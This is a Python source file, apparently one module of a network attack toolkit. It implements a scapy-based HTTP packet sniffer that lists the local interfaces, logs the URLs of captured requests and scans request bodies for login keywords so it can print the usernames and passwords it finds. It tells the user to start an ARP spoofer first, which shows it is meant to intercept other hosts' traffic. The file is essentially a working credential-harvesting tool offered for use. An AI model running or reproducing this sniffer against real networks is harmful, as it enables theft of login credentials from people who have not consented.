import time
from colorama import Fore
from colorama import Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
choice = "y"
def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig",interface])
        return re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output)).group(0)
    except:
        pass

def get_current_ip(interface):
    output = subprocess.check_output(["ifconfig", interface])
    pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    output1 = output.decode()
    ip = pattern.search(output1)[0]
    return ip

def ip_table():
    addrs = psutil. net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address',f'IP Address{Style.RESET_ALL}'])
    for k,v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k,mac,ip])
        elif mac:
            t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k,f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}"])
    print(t)

def sniff(interface):
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is send >>>>", test , f"{Style.RESET_ALL}")
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)

def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        load_decode = load.decode()
        keywords = ["username","user","email","pass","login","password"]
        for i in keywords:
            if i in load_decode:
                return load_decode
def url_extractor(packet):
    http_layer = packet.getlayer('HTTPRequest').fields
    ip_layer = packet.getlayer('IP').fields
    print(ip_layer["src"],"just request \n",http_layer["Method"].decode()," ",http_layer["Path"].decode())
    return

def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------***Raw HTTP Packet***---------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k,v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}" .format(k,label))
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
    print("-----------------------------")
    print(httplayer)

def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***]please Start Arp Spoofer Before Using this Module[***] {Style.RESET_ALL}")

    try:
        global choice
        choice = input("[*] Do you want to print raw packet : Y?N :")
        ip_table()
        interface = input("[*] please enter the interface name: ")
        print("[*] Sniffing packet...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirect to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)